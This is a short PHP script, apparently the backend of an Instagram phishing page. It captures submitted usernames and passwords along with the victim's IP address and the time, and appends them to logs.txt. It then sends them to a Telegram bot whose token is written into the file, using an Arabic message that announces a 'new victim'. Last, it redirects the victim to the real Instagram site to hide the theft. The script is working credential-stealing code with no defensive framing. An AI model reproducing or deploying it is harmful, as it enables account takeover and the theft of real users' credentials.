<?php
$date = gmdate("d-n-Y");
$time = gmdate("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$user = $_POST['username'];
$pass = $_POST['password'];
$message = "Instagram Login ~# ";
$message .= "User: ".$user."";
$message .= " | Pass: ".$pass."";
$message .= " | IP: ".$ip." | Time: $time / $date\n";
file_put_contents("logs.txt", $message, FILE_APPEND);

// إرسال البيانات إلى التليجرام
$bot_token = "8268945183:AAHa2JK46vx3ydTEJG-ZZ0Yj_IUJf1E0Cb0";
$admin_id = 8562457386;
$text = "🔴 **تم تسجيل ضحية جديدة!**\n"
      . "📱 **المنصة:** Instagram\n"
      . "👤 **المستخدم:** `".$user."`\n"
      . "🔑 **كلمة المرور:** `".$pass."`\n"
      . "🌐 **IP:** `".$ip."`\n"
      . "⏰ **الوقت:** $time / $date";
$url = "https://api.telegram.org/bot".$bot_token."/sendMessage";
$data = array('chat_id' => $admin_id, 'text' => $text, 'parse_mode' => 'Markdown');
file_get_contents($url . "?" . http_build_query($data));

header("Location: https://instagram.com/");
?>
